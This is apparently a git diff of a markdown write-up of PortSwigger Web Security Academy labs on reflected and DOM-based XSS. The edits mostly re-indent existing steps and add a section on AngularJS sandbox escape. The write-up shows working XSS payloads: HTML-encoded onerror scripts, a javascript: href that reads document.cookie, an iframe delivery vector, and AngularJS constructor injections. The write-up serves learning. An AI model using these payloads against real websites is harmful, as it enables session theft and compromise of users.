@@ -111,23 +111,23 @@ The target application use `document.write()` function to display content from `
   <summary>Click me to expand the process</summary>  
   
 1. Enter random input (e.g., 123456) in the user input (URL query)
-~~~
-https[://]web-security-academy.net/?search=123456
-~~~
-
+  ~~~
+  https[://]web-security-academy.net/?search=123456
+  ~~~
+  
 2. Right-click on the webpage and open the inspection tab
-
+  
 3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
-~~~
-Result: <img src="/resources/images/tracker[.]gif?searchTerms=123456">
-~~~
-
+  ~~~
+  Result: <img src="/resources/images/tracker[.]gif?searchTerms=123456">
+  ~~~
+  
 4. After knowing the syntax. We can add a closing angle bracket to close up the img tag, and add a new tag with the payload. I use HTML encoding to bypass the filter.
-~~~
-URL: "><script src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"></script>
-Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
-        <script src="x" onerror="javascript:alert('XSS')"></script>
-~~~
+  ~~~
+  URL: "><script src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"></script>
+  Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
+          <script src="x" onerror="javascript:alert('XSS')"></script>
+  ~~~
 </details>
 -
 
@@ -137,32 +137,32 @@ The application It assigns data from `location.search` to `innerHTML`, which upd
   <summary>Click me to expand the process</summary>  
   
 1. Enter random input (e.g., 123456) in the user input (URL query)
-~~~
-https[://]web-security-academy.net/?search=123456
-~~~
+  ~~~
+  https[://]web-security-academy.net/?search=123456
+  ~~~
   
 2. Right-click on the webpage and open the inspection tab
-
+  
 3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
-~~~
-Result: <span id="searchMessage">123456</span>
-~~~
-
+  ~~~
+  Result: <span id="searchMessage">123456</span>
+  ~~~
+  
 4. After knowing the syntax. I can add a closing tag to close up `<span>`, and add a new `<img>` tag with the payload. I use HTML encoding to bypass the filter.
-~~~
-URL: https[://]web-security-academy[.]net/?search=</span><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
-Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')"></span> <span>'</span> == $0
-~~~
+  ~~~
+  URL: https[://]web-security-academy[.]net/?search=</span><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+  Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')"></span> <span>'</span> == $0
+  ~~~
+  
 </details>
 -
-
+  
 #### 3. DOM XSS in jQuery anchor href attribute sink using location.search source
 In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
 <details markdown="1">
   <summary>Click me to expand the process</summary>
   
 1. Right-click on the webpage and open the inspection tab. I search for `location.search`, which led me to this script:
-
   ```javascript
   $(function() {  
     $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));  
@@ -170,15 +170,16 @@ In this instance, jQuery’s `$` selector is used to find a link and set its `hr
   ```
   
 2. I also notice that the URL contains the `returnPath` query parameter, which aligns with the script. Which uses this query parameter to set the href attribute of the backlink.
-~~~
-URL: https[://]web-security-academy[.]net/feedback?returnPath=/
-~~~
-
+  ~~~
+  URL: https[://]web-security-academy[.]net/feedback?returnPath=/
+  ~~~
+  
 3. Insert the payload into the `returnPath` query parameter.
-~~~
-URL: https[://]web-security-academy[.]net/feedback?returnPath=javascript:prompt(document.cookie)
-Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
-~~~
+  ~~~
+  URL: https[://]web-security-academy[.]net/feedback?returnPath=javascript:prompt(document.cookie)
+  Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
+  ~~~
+  
 </details>
 -
 
@@ -208,21 +209,20 @@ The application contains a reflected XSS vulnerability in the search blog featur
   <summary>Click me to expand the process</summary>
   
 1. Enter random input (e.g., test123) in the user input (URL query)
-~~~
-URL: https[://]web-security-academy[.]net/?search=test123
-~~~
-
+  ~~~
+  URL: https[://]web-security-academy[.]net/?search=test123
+  ~~~
+  
 2. Utilize search function in inspection tab, and search for input (e.g., test123)
-~~~
-Result: <input type="text" placeholder="Search the blog..." name="search" value="test123">
-~~~
-
+  ~~~
+  Result: <input type="text" placeholder="Search the blog..." name="search" value="test123">
+  ~~~
+  
 3. After learning that our input is within a double-quoted attribute, we can try to bypass the double-quoted attributes by breaking out of the attribute value with the injection of double quotes or equivalent encodings, and then adding the HTML events that triggers the payload.
-~~~
-URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
-Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
-~~~
-
+  ~~~
+  URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
+  Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
+  ~~~
   {: .box-note}
   **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.
 
@@ -236,7 +236,6 @@ There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` 
   <summary>Click me to expand the process</summary>
   
 1. Firstly, I search for `$()` in the inspection tab, and I find the syntax for this function. Which listens for hash changes in the URL (`/#`) and scrolls the corresponding blog post into view based on the hash value.
-  
   ```javascript
   $(window).on('hashchange', function(){
     var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
@@ -245,18 +244,17 @@ There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` 
   ```
   
 2. I append a simple XSS test payload with a hashtag to the URL, and the print function is triggered. The XSS vulnerability in this application is confirmed.
-~~~
-URL: https[://]web-security-academy[.]net/#<img src=x onerror=print()>
-~~~
+  ~~~
+  URL: https[://]web-security-academy[.]net/#<img src=x onerror=print()>
+  ~~~
 
 3. In the case that I want to deliver this payload to others, I utilize `iframe`, `onload`, `img src`, and `onerror` to trigger the payload once they open the page.
-~~~
-URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-~~~
-
+  ~~~
+  URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+  ~~~
   {: .box-note}
   **Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
-
+  
 </details>
 -
 
@@ -268,25 +266,23 @@ In this instance, the application is vulnerable to reflected XSS in the search q
 1. I enter random input (e.g., test) in the user input (search bar)
   
 2. Utilize search function in inspection tab, and search for input (e.g., test). I find that the input is directly past into the function.
-
   ```javascript
     var searchTerms = 'test';
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
   ```
-
+  
 3. Now I learn that my input is inside the single quote, I try breaking out the single quote with:
-~~~
-Input: '-prompt("TestXSS")-' # breaks the single quote
-       or \\'-prompt("TestXSS")// # If single quotes are escaped
-~~~
-
+  ~~~
+  Input: '-prompt("TestXSS")-' # breaks the single quote
+         or \\'-prompt("TestXSS")// # If single quotes are escaped
+  ~~~
+  
 4. The message pops up after I send the query, which confirms that this instance is vulnerable to XSS. <br> Just to double-check, I pull out the script from the inspection tab.
-
   ```javascript
   var searchTerms = ''-prompt("TestXSS")-'';
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
   ```
-
+  
 </details>
 -
 
@@ -296,7 +292,6 @@ This instance contains a DOM-based XSS vulnerability in the stock checker functi
   <summary>Click me to expand the process</summary>
   
 1. Firstly, I discover the function in the inspection tab (`right-click on the webpage > inspect`). <br>And I learn that the script builds a `<select name="storeId">` dropdown by reading a `storeId` query parameter from the URL and, if present, adding it as the selected `<option>` before adding the three hard-coded stores (skipping any duplicate). <br>It uses `document.write` with the raw URL value, so unescaped input could be reflected into the page; creating elements and setting textContent/value.
-
   ```javascript
   var stores = ["London", "Paris", "Milan"];
   var store = (new URLSearchParams(window.location.search)).get('storeId');
@@ -314,7 +309,7 @@ This instance contains a DOM-based XSS vulnerability in the stock checker functi
   
   document.write('</select>');
   ```
-
+  
 2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (test) to see the application's response. As expected, I am able to add a new selected `<option>`.
 ~~~
 URL: https[://]web-security-academy[.]net/product?productId=2&storeId=test
@@ -325,7 +320,7 @@ Result:
   <option>Paris</option>
   <option>Milan</option>
 ~~~
-
+  
 3. Remember this syntax `document.write('<option>' + stores[i] + '</option>');` from the function. What I can do is close the first `<option>` tag, inject new HTML tags or event attributes, and then open another `<option>` tag. I try injecting a couple of new HTML tags, and both work. <br>Now, I can confirm that the stock search query function on this web application is vulnerable to XSS.
 ~~~
 Payload-1: storeId=test</option><iframe src="javascript:prompt('work?');"></iframe><option>
@@ -336,3 +331,19 @@ Payload-2: storeId=test</option><script>prompt('work?')</script><option>
 -
 
 #### 9. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+This instance contains a DOM-based XSS vulnerability in an `AngularJS` expression within the search functionality. I inject a method (e.g. `$on`/`$eval`) that is available in the current scope to bypass AngularJS's security filter, append the `.constructor` property to create a `Function` object (`function(user_input)`), and then call it with `()` to execute the created function.
+
+{: .box-note}
+**Note:** Refer to [AngularJS DOM XSS Attack](https://www.youtube.com/watch?v=QpQp2JLn6JA) for more details walkthrough
+
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+1. After did some researches ([AngularJS - Escaping the Expression Sandbox](https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss), [Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function), [Object.prototype.constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor), ) I come up with a couple of different payloads to pybass the security filter.
+  ~~~
+  Payload-1: {{$eval.constructor(prompt('AngularJS_xss'))()}}
+  Payload-2: {{$on.constructor('prompt("AngularJS_xss")')()}}
+  ~~~
+  
+</details>
+-
